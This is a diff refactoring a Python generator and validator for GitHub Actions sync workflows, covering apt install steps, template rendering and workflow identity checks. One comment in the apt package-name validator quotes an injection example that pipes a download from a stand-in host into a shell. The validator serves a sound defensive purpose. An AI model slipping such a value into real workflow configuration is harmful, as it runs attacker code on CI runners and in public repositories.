@@ -52,19 +52,6 @@ rejects the mismatch rather than letting the two silently diverge.
 """
 
 
-def _uses_placeholders() -> dict[str, str]:
-    """Render keys for each pinned action, e.g. ``USES_SETUP_PYTHON``."""
-    return {
-        f"USES_{_action_token(action)}": pin.uses
-        for action, pin in GITHUB_ACTION_PINS.items()
-    }
-
-
-def _action_token(action: str) -> str:
-    """Return the placeholder suffix for one action path."""
-    return "_".join(part.replace("-", "_").upper() for part in action.split("/")[1:])
-
-
 # System (apt) packages installed before both public package validation and
 # public-to-source import validation. Both workflows run the same test suite, so
 # they MUST provision the same system tools; rendering this single setting into
@@ -119,33 +106,61 @@ class SyncSettings:
     """
 
     package_name: str
+
     sync_label: str
+
     source_root: str
+
     public_repo: str
+
     source_repo: str
+
     copybarista_project_path: str
+
     smoke_import: str
+
     type_check_targets: tuple[str, ...]
+
     forbidden_pr_text: tuple[str, ...]
+
     export_watch_paths: tuple[str, ...] = ()
+
     release_check_script: str = ""
+
     validation_python_versions: tuple[str, ...] = DEFAULT_VALIDATION_PYTHON_VERSIONS
+
     validation_commands: tuple[str, ...] = ()
+
     validation_commands_comment: tuple[str, ...] = ()
+
     system_packages: tuple[str, ...] = DEFAULT_SYSTEM_PACKAGES
+
     sync_user_name: str = DEFAULT_SYNC_USER_NAME
+
     sync_user_email: str = DEFAULT_SYNC_USER_EMAIL
+
     sync_token_login: str = ""
+
     export_branch_prefix: str = ""
+
     import_branch_prefix: str = ""
+
     pr_default_title: str = ""
+
     pr_default_body: str = ""
+
     require_pr_metadata: bool = False
+
     pr_metadata_source: str = "commit_messages"
+
     replay_bootstrap_base: str = ""
+
     replay_bootstrap_base_comment: tuple[str, ...] = ()
+
     publish_source_rev: bool = False
+
     refresh_public_lockfile: bool = False
+
     skip_source_validation: bool = False
 
     def __post_init__(self) -> None:
@@ -183,6 +198,37 @@ class SyncSettings:
     def import_prefix(self) -> str:
         """Return the public-to-source branch prefix."""
         return self.import_branch_prefix or f"{self.branch_slug}/import/"
+
+
+def _branch_slug(value: str) -> str:
+    """Return the generated branch slug for a package name."""
+    slug = "".join(char if char.isalnum() else "-" for char in value.casefold()).strip(
+        "-"
+    )
+    if not slug:
+        raise ConfigError(
+            "sync.package_name must contain at least one alphanumeric character."
+        )
+    return slug
+
+
+# The lint/type/test checks are delegated to the package's own ``.pre-commit-
+# config.yaml`` rather than restated here: restating them means every added hook must be
+# copied into this list too, and the copy that gets forgotten is a check the public repo
+# silently stops running. Only the steps pre-commit does not own -- the environment
+# sync, the import smoke test, and the wheel build -- stay as explicit commands.
+#
+# Which paths basedpyright checks is likewise the ``basedpyright-global`` hook's
+# business, so ``type_check_targets`` is not a parameter here.
+def _default_validation_commands(*, smoke_import: str) -> tuple[str, ...]:
+    """Build the default exported-package validation command list."""
+    return (
+        "uv sync --all-groups",
+        "uv run pre-commit run --all-files --hook-stage pre-commit",
+        "uv run pre-commit run --all-files --hook-stage pre-push",
+        f'uv run python -c "import {smoke_import}"',
+        "uv build",
+    )
 
 
 def load_sync_settings(path: Path) -> SyncSettings:
@@ -690,123 +736,6 @@ def import_workflow(settings: SyncSettings) -> str:
     )
 
 
-def _system_deps_step(packages: tuple[str, ...], *, guarded: bool) -> str:
-    """Render the apt system-package install step for a validation workflow.
-
-    Both the public package-validation workflow and the public-to-source import
-    workflow run the same test suite and therefore need the same system tools.
-    Rendering this single step into both keeps their environments aligned.
-
-    Args:
-      packages: apt package names to install (e.g. ``ripgrep``, ``fd-find``).
-      guarded: Whether to gate the step on the import workflow's ``enabled``
-          output (the import workflow runs steps conditionally; package
-          validation does not).
-
-    Returns:
-      step_yaml: The rendered ``steps`` entry, trailing newline included, or an
-          empty string when no packages are requested.
-
-    """
-    if not packages:
-        return ""
-    guard = "        if: steps.settings.outputs.enabled == 'true'\n" if guarded else ""
-    names = " ".join(packages)
-    lines = [
-        # Cache the downloaded .debs, so a warm run never reaches the mirror
-        # that stalled below. Keyed on the package list, so adding one busts it;
-        # `apt-get install` is idempotent, so a hit merely skips the download.
-        "      - name: Cache apt packages\n",
-        guard,
-        f"        uses: {GITHUB_ACTION_PINS['actions/cache'].uses}\n",
-        "        with:\n",
-        "          path: /var/cache/apt/archives\n",
-        f"          key: apt-${{{{ runner.os }}}}-{_packages_key(packages)}\n",
-        "      - name: Install system packages\n",
-        guard,
-        "        run: |\n",
-        # Bounded and retried. An Ubuntu mirror stalled `apt-get update` for 44
-        # minutes -- 02:23:21 to 03:07:36 -- until the 45-minute job cap
-        # cancelled two exports, reporting only "The operation was canceled".
-        # The command normally takes ~15s, and nothing here limited it.
-        #
-        # The timeout turns a hang into a fast, legible failure; the retry is
-        # what still lets a transient stall succeed, since apt fell back from
-        # the Azure mirror to archive.ubuntu.com within that same run. Failing
-        # after three tries is a real outage and must stay red.
-        "          for attempt in 1 2 3; do\n",
-        "            timeout 120 sudo apt-get update && break\n",
-        '            echo "apt-get update stalled (attempt $attempt)" >&2\n',
-        "            sleep $((attempt * 10))\n",
-        "          done\n",
-        f"          timeout 300 sudo apt-get install -y --no-install-recommends {names}\n",
-    ]
-    if "postgresql" in packages:
-        # pgvector ships as `postgresql-<major>-pgvector`, so the name depends
-        # on which server apt resolved and cannot sit in the flat list. Without
-        # it a runner that HAS Postgres (ubuntu-latest preinstalls 16) fails
-        # every integration test with `extension "vector" is not available`
-        # rather than skipping -- the capability gate in the shared pre-commit
-        # config deliberately runs when `pg_config` is present.
-        lines.append(
-            '          PG_MAJOR="$(apt-cache depends postgresql '
-            "| grep -m1 -oP 'postgresql-\\K\\d+' || true)\"\n"
-        )
-        lines.append(
-            '          if [ -n "$PG_MAJOR" ]; then sudo apt-get install -y '
-            '--no-install-recommends "postgresql-${PG_MAJOR}-pgvector"; fi\n'
-        )
-    return "".join(lines)
-
-
-def _packages_key(packages: tuple[str, ...]) -> str:
-    """Return a cache-key segment identifying one apt package set.
-
-    Hashed rather than joined: the names go into a cache key, which GitHub caps
-    at 512 characters, and a package list is unbounded.
-    """
-    return hashlib.sha256(" ".join(sorted(packages)).encode()).hexdigest()[:16]
-
-
-def _render_template(name: str, values: dict[str, str]) -> str:
-    """Render one package-data template with explicit token replacement.
-
-    Every rendered file is prefixed with a DO-NOT-EDIT banner. Six of the
-    seven export workflows were hand-edited for months precisely because
-    nothing on the file said not to, so the banner is emitted here rather
-    than written into each template, where the next new template would
-    silently omit it.
-    """
-    text = (
-        resources.files(f"{__package__}.templates")
-        .joinpath(name)
-        .read_text(encoding="utf-8")
-    )
-    # Action pins are injected for every template rather than passed by each
-    # caller: they are the same everywhere, and a caller that forgot one would
-    # trip the unrendered-token check below instead of silently shipping a
-    # stale version.
-    for key, value in (_uses_placeholders() | values).items():
-        text = text.replace(f"@@{key}@@", value)
-    if "@@" in text:
-        raise AssertionError(f"Unrendered token in template {name}.")
-    return _generated_banner(name) + text
-
-
-def _generated_banner(template_name: str) -> str:
-    """Return the DO-NOT-EDIT header for a file rendered from ``template_name``."""
-    # Names carry a ``.tmpl`` suffix, so test the type BEFORE it: every
-    # template rendered today is YAML or TOML, both ``#``-commented.
-    comment = "#"
-    # Public-safe wording: these files ship to the public repositories, whose
-    # leak check rejects both monorepo paths and the generator's own name.
-    return (
-        f"{comment} DO NOT EDIT -- generated from {template_name} and this\n"
-        f"{comment} package's sync config. Hand edits are overwritten; change\n"
-        f"{comment} the template, the generator, or the sync config instead.\n"
-    )
-
-
 def workflow_dir(root: Path) -> Path:
     """Where ``root``'s generated public workflows live.
 
@@ -824,6 +753,13 @@ def workflow_dir(root: Path) -> Path:
     because that is the tree that reaches the public repository; a bare
     ``.github/`` sitting alongside holds monorepo-only workflows the export
     excludes, so validating those would check files that never ship.
+
+    Args:
+      root: Root.
+
+    Returns:
+      result: The Path.
+
     """
     staged = root / ".export" / ".github" / "workflows"
     return staged if staged.is_dir() else root / ".github" / "workflows"
@@ -934,23 +870,15 @@ def _validate_import_workflow_yaml(
     )
 
 
+# ``github.event.before`` is the pushed commit's parent, which equals the commit the
+# source last absorbed only while every import lands. Once one fails or goes unmerged
+# the parent marches on while the source stays pinned, so a parent baseline hands the
+# three-way merge a wrong common ancestor and manufactures conflicts. Resolving it needs
+# the ledger (the target checkout) and the helper that reads it to exist first, and the
+# public checkout that consumes it to come after -- so the ORDER is checked here, not
+# just the flags: a reordering silently reintroduces the parent baseline.
 def _assert_resolves_baseline_from_ledger(steps: list[object]) -> None:
-    """Assert a push import merges against the ledger, not the pushed parent.
-
-    ``github.event.before`` is the pushed commit's parent, which equals the
-    commit the source last absorbed only while every import lands. Once one
-    fails or goes unmerged the parent marches on while the source stays pinned,
-    so a parent baseline hands the three-way merge a wrong common ancestor and
-    manufactures conflicts. Resolving it needs the ledger (the target checkout)
-    and the helper that reads it to exist first, and the public checkout that
-    consumes it to come after -- so the ORDER is checked here, not just the
-    flags: a reordering silently reintroduces the parent baseline.
-
-    Raises:
-      ConfigError: If the baseline flags are absent or the steps are ordered so
-        the ledger is unreadable where the baseline is chosen.
-
-    """
+    """Assert a push import merges against the ledger, not the pushed parent."""
     refs_run = _workflow_step_run(steps, "Resolve public refs")
     for text in ("--print-synced-base", '--fallback-sha "${{ github.event.before }}"'):
         if text not in refs_run:
@@ -1011,19 +939,16 @@ def _workflow_step_index(
     return matches[0]
 
 
+# This replaced a hand-listed field check (job name, python-version, the command lines,
+# apt packages). Such a check only catches what its author enumerated, and the omissions
+# were the whole security surface: ``on:`` triggers, ``permissions``, ``concurrency``,
+# and ``runs-on`` all passed unexamined, so a hand edit granting ``contents: write`` was
+# accepted. The export and import workflows were already guarded this way
+# (``sync_workflow_identity_test.py``); this closes the third file.
 def _validate_package_validation_workflow_yaml(
     *, workflow_text: str, settings: SyncSettings
 ) -> None:
-    """Assert the workflow is byte-identical to what the generator produces.
-
-    This replaced a hand-listed field check (job name, python-version, the
-    command lines, apt packages). Such a check only catches what its author
-    enumerated, and the omissions were the whole security surface: ``on:``
-    triggers, ``permissions``, ``concurrency``, and ``runs-on`` all passed
-    unexamined, so a hand edit granting ``contents: write`` was accepted. The
-    export and import workflows were already guarded this way
-    (``sync_workflow_identity_test.py``); this closes the third file.
-    """
+    """Assert the workflow is byte-identical to what the generator produces."""
     if workflow_text == package_validation_workflow(settings):
         return
     raise ConfigError(
@@ -1032,15 +957,13 @@ def _validate_package_validation_workflow_yaml(
     )
 
 
+# Both validation workflows run the same test suite, so each must provision the same
+# system tools; this check fails the config if either workflow drifts from
+# ``system_packages``.
 def _assert_installs_system_packages(
     *, steps: list[object], packages: tuple[str, ...], workflow: str
 ) -> None:
-    """Assert a workflow's steps install every configured system package.
-
-    Both validation workflows run the same test suite, so each must provision the
-    same system tools; this check fails the config if either workflow drifts from
-    ``system_packages``.
-    """
+    """Assert a workflow's steps install every configured system package."""
     if not packages:
         return
     # Parse the install step's argv rather than substring-searching every
@@ -1058,15 +981,13 @@ def _assert_installs_system_packages(
             )
 
 
+# ``workflow`` names the file in the error text: this helper serves both generated
+# workflows, and hardcoding one name sent operators debugging a broken ``package-
+# validation.yml`` to ``sync-to-source.yml`` instead.
 def _workflow_step_run(
     steps: list[object], name: str, *, workflow: str = "sync-to-source.yml"
 ) -> str:
-    """Return the shell script for a named workflow step.
-
-    ``workflow`` names the file in the error text: this helper serves both
-    generated workflows, and hardcoding one name sent operators debugging a
-    broken ``package-validation.yml`` to ``sync-to-source.yml`` instead.
-    """
+    """Return the shell script for a named workflow step."""
     for step in steps:
         step_map = _yaml_mapping(step, f"{workflow} steps.{name}")
         if step_map.get("name") == name:
@@ -1179,28 +1100,6 @@ def _required_str_tuple(sync: dict[str, object], key: str) -> tuple[str, ...]:
     return tuple(strings)
 
 
-def _default_validation_commands(*, smoke_import: str) -> tuple[str, ...]:
-    """Build the default exported-package validation command list.
-
-    The lint/type/test checks are delegated to the package's own
-    ``.pre-commit-config.yaml`` rather than restated here: restating them
-    means every added hook must be copied into this list too, and the copy
-    that gets forgotten is a check the public repo silently stops running.
-    Only the steps pre-commit does not own -- the environment sync, the
-    import smoke test, and the wheel build -- stay as explicit commands.
-
-    Which paths basedpyright checks is likewise the ``basedpyright-global``
-    hook's business, so ``type_check_targets`` is not a parameter here.
-    """
-    return (
-        "uv sync --all-groups",
-        "uv run pre-commit run --all-files --hook-stage pre-commit",
-        "uv run pre-commit run --all-files --hook-stage pre-push",
-        f'uv run python -c "import {smoke_import}"',
-        "uv build",
-    )
-
-
 def _validate_settings(settings: SyncSettings) -> None:
     """Validate sync settings before writing workflow files."""
     for name, value in (
@@ -1277,15 +1176,12 @@ def _validate_settings(settings: SyncSettings) -> None:
     _validate_branch_prefix(settings.import_prefix, name="import_branch_prefix")
 
 
+# ``_system_deps_step`` joins these straight into a workflow ``run:``, so a value like
+# ``ripgrep; curl evil | sh`` renders executable shell into a workflow that ships to a
+# public repository. Debian policy already limits package names to lowercase
+# alphanumerics plus ``+-.``, so the safe set costs nothing.
 def _validate_apt_package(value: str, *, name: str) -> None:
-    """Reject apt names that would not survive interpolation into a shell line.
-
-    ``_system_deps_step`` joins these straight into a workflow ``run:``, so a
-    value like ``ripgrep; curl evil | sh`` renders executable shell into a
-    workflow that ships to a public repository. Debian policy already limits
-    package names to lowercase alphanumerics plus ``+-.``, so the safe set
-    costs nothing.
-    """
+    """Reject apt names that would not survive interpolation into a shell line."""
     if not re.fullmatch(r"[a-z0-9][a-z0-9+.-]*", value):
         raise ConfigError(
             f"sync.{name} entries must be Debian package names "
@@ -1410,13 +1306,113 @@ def _sh(value: str) -> str:
     return shlex.quote(value)
 
 
-def _branch_slug(value: str) -> str:
-    """Return the generated branch slug for a package name."""
-    slug = "".join(char if char.isalnum() else "-" for char in value.casefold()).strip(
-        "-"
-    )
-    if not slug:
-        raise ConfigError(
-            "sync.package_name must contain at least one alphanumeric character."
+def _uses_placeholders() -> dict[str, str]:
+    """Render keys for each pinned action, e.g. ``USES_SETUP_PYTHON``."""
+    return {
+        f"USES_{_action_token(action)}": pin.uses
+        for action, pin in GITHUB_ACTION_PINS.items()
+    }
+
+
+def _action_token(action: str) -> str:
+    """Return the placeholder suffix for one action path."""
+    return "_".join(part.replace("-", "_").upper() for part in action.split("/")[1:])
+
+
+# Both the public package-validation workflow and the public-to-source import workflow
+# run the same test suite and therefore need the same system tools. Rendering this
+# single step into both keeps their environments aligned.
+def _system_deps_step(packages: tuple[str, ...], *, guarded: bool) -> str:
+    """Render the apt system-package install step for a validation workflow."""
+    if not packages:
+        return ""
+    guard = "        if: steps.settings.outputs.enabled == 'true'\n" if guarded else ""
+    names = " ".join(packages)
+    lines = [
+        # Cache the downloaded .debs, so a warm run never reaches the mirror
+        # that stalled below. Keyed on the package list, so adding one busts it;
+        # `apt-get install` is idempotent, so a hit merely skips the download.
+        "      - name: Cache apt packages\n",
+        guard,
+        f"        uses: {GITHUB_ACTION_PINS['actions/cache'].uses}\n",
+        "        with:\n",
+        "          path: /var/cache/apt/archives\n",
+        f"          key: apt-${{{{ runner.os }}}}-{_packages_key(packages)}\n",
+        "      - name: Install system packages\n",
+        guard,
+        "        run: |\n",
+        # Bounded and retried. An Ubuntu mirror stalled `apt-get update` for 44
+        # minutes -- 02:23:21 to 03:07:36 -- until the 45-minute job cap
+        # cancelled two exports, reporting only "The operation was canceled".
+        # The command normally takes ~15s, and nothing here limited it.
+        #
+        # The timeout turns a hang into a fast, legible failure; the retry is
+        # what still lets a transient stall succeed, since apt fell back from
+        # the Azure mirror to archive.ubuntu.com within that same run. Failing
+        # after three tries is a real outage and must stay red.
+        "          for attempt in 1 2 3; do\n",
+        "            timeout 120 sudo apt-get update && break\n",
+        '            echo "apt-get update stalled (attempt $attempt)" >&2\n',
+        "            sleep $((attempt * 10))\n",
+        "          done\n",
+        f"          timeout 300 sudo apt-get install -y --no-install-recommends {names}\n",
+    ]
+    if "postgresql" in packages:
+        # ``pgvector`` ships as `postgresql-<major>-pgvector`, so the name depends
+        # on which server apt resolved and cannot sit in the flat list. Without
+        # it a runner that HAS Postgres (ubuntu-latest preinstalls 16) fails
+        # every integration test with `extension "vector" is not available`
+        # rather than skipping -- the capability gate in the shared pre-commit
+        # config deliberately runs when `pg_config` is present.
+        lines.append(
+            '          PG_MAJOR="$(apt-cache depends postgresql '
+            "| grep -m1 -oP 'postgresql-\\K\\d+' || true)\"\n"
         )
-    return slug
+        lines.append(
+            '          if [ -n "$PG_MAJOR" ]; then sudo apt-get install -y '
+            '--no-install-recommends "postgresql-${PG_MAJOR}-pgvector"; fi\n'
+        )
+    return "".join(lines)
+
+
+# Hashed rather than joined: the names go into a cache key, which GitHub caps at 512
+# characters, and a package list is unbounded.
+def _packages_key(packages: tuple[str, ...]) -> str:
+    """Return a cache-key segment identifying one apt package set."""
+    return hashlib.sha256(" ".join(sorted(packages)).encode()).hexdigest()[:16]
+
+
+# Every rendered file is prefixed with a DO-NOT-EDIT banner. Six of the seven export
+# workflows were hand-edited for months precisely because nothing on the file said not
+# to, so the banner is emitted here rather than written into each template, where the
+# next new template would silently omit it.
+def _render_template(name: str, values: dict[str, str]) -> str:
+    """Render one package-data template with explicit token replacement."""
+    text = (
+        resources.files(f"{__package__}.templates")
+        .joinpath(name)
+        .read_text(encoding="utf-8")
+    )
+    # Action pins are injected for every template rather than passed by each
+    # caller: they are the same everywhere, and a caller that forgot one would
+    # trip the unrendered-token check below instead of silently shipping a
+    # stale version.
+    for key, value in (_uses_placeholders() | values).items():
+        text = text.replace(f"@@{key}@@", value)
+    if "@@" in text:
+        raise AssertionError(f"Unrendered token in template {name}.")
+    return _generated_banner(name) + text
+
+
+def _generated_banner(template_name: str) -> str:
+    """Return the DO-NOT-EDIT header for a file rendered from ``template_name``."""
+    # Names carry a ``.tmpl`` suffix, so test the type BEFORE it: every
+    # template rendered today is YAML or TOML, both ``#``-commented.
+    comment = "#"
+    # Public-safe wording: these files ship to the public repositories, whose
+    # leak check rejects both monorepo paths and the generator's own name.
+    return (
+        f"{comment} DO NOT EDIT -- generated from {template_name} and this\n"
+        f"{comment} package's sync config. Hand edits are overwritten; change\n"
+        f"{comment} the template, the generator, or the sync config instead.\n"
+    )
